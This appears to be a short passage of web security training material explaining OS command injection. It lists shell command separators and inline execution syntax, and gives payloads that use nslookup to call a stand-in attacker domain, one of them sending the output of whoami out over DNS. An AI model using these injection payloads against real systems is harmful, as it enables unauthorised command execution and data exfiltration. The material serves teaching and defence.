& nslookup kgji2ohoyw.web-attacker.com &

A number of characters function as command separators, allowing commands to be chained together. The following command separators work on both Windows and Unix-based systems:

&
&&
|
||
The following command separators work only on Unix-based systems:

;
Newline (0x0a or \n)
On Unix-based systems, you can also use backticks or the dollar character to perform inline execution of an injected command within the original command:

\` injected command 
$( injected command )

The out-of-band channel also provides an easy way to exfiltrate the output from injected commands:

& nslookup \`whoami\`.kgji2ohoyw.web-attacker.com &

This will cause a DNS lookup to the attacker's domain containing the result of the whoami command:

wwwuser.kgji2ohoyw.web-attacker.com
